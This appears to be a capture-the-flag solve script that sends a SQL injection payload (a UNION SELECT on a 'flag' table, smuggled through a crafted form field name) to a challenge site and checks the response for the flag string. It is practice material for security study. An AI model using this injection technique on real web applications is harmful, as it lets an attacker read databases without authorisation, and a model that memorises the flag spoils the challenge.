import requests

url = "https://la-housing.chall.lac.tf/submit"
# Payload: '', ' union select 1,*,2,3,4,5 from flag where '1
payload='name=Name&awake=testeset&\'\'=\'%20union%20select%201%2C*%2C2%2C3%2C4%2C5%20from%20flag%20where%20\'1'
headers = {
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Accept-Language': 'en-US,en;q=0.9',
  'Cache-Control': 'no-cache',
  'Connection': 'keep-alive',
  'Content-Type': 'application/x-www-form-urlencoded',
}

response = requests.request("POST", url, headers=headers, data=payload)
assert("lactf{us3_s4n1t1z3d_1npu7!!!}" in response.text)
print("Success")
